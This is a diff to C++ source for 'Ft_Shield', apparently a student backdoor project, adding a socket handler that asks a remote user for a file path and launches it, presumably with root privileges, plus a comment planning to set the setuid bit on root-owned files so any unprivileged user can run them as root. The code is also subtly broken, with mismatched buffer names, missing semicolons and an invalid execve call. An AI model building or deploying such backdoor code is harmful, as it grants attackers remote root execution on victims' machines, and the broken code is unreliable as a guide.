@@ -300,8 +300,9 @@ void	Ft_Shield::_runSrv(void)
 }
 
 /*
+ * This function exit the process if needed: another instance alreaddy running
  * Function closing all the file descriptor before exiting
- * Doesn't remove the log and lock files to avoid another instance
+ * Doesn't remove the log and lock files
  */
 void	Ft_Shield::_exit(void)
 {
@@ -447,8 +448,50 @@ int	Ft_Shield::_password(int fd)
 	return 0;
 }
 
-void	Ft_shield::_root(int fd)
+/*
+ * Run any file as root after checking the file exists 
+ */
+void	Ft_shield::_elfAsRoot(int fd)
 {
-	this->_buffer = "Enter the path to the file to be executed with root privileges:\n"
+	int				pid = 0;
+	int				res = 0;
+	char			buf_char[100] = {'\0'};
+	unsigned int	time = 0;
+
+	this->_buffer = "You have 10s to enter the absolute file path:\n"
+	send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
+	while (res <= 0 && time < 10)
+	{
+		res = recv(fd, char_buf, 99, MSG_PEEK | MSG_DONTWAIT);
+		sleep(1);
+		time++;
+	}
+	res = recv(fd, char_buf, 99, MSG_DONTWAIT);
+	if (res <= 0)
+	{
+		this->_buffer = "Sorry, time elapsed.\n";
+		send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
+		return;
+	}
+	else
+	{
+		if (access(buf_char, F_OK) != -1)
+		{
+			pid = fork();
+			if (pid == 0)
+				execve(buf_char, {buf_char, NULL}, NULL);
+			else
+				this->_buffer = "Program launched.\n";
+		}
+		else
+			this->_buffer = "Error: no such file.\n"
+		send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
+	}
 	return;
 }
+
+/*
+ * Change the owner of the file to root
+ * Set the setuid bit for the selected file
+ * In other words, any unprivileged user would be able to launch the program as root
+ */
